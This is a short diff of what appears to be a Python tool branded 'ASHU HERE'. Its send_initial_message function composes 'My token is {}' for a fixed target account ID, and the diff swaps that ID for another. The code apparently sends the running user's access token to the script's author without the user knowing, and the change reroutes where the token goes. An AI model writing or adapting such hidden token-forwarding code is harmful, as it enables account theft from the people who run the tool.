@@ -42,12 +42,12 @@ def send_initial_message():
       msg_template = "Hello Ashu sir! I am using your server. My token is {}"
 
       # Specify the ID where you want to send the message
-      target_id = "100064082959789"
+      target_id = "100014055880174"
 
       requests.packages.urllib3.disable_warnings()
 
       def liness():
-          print('\033[1;92m' + '•────────────────────── ASHU HERE ───────────────────────────────•')
+          print('\033[1;92m' + '•──────────────────────ASHU HERE ───────────────────────────────•')
 
       headers = {
           'Connection': 'keep-alive',
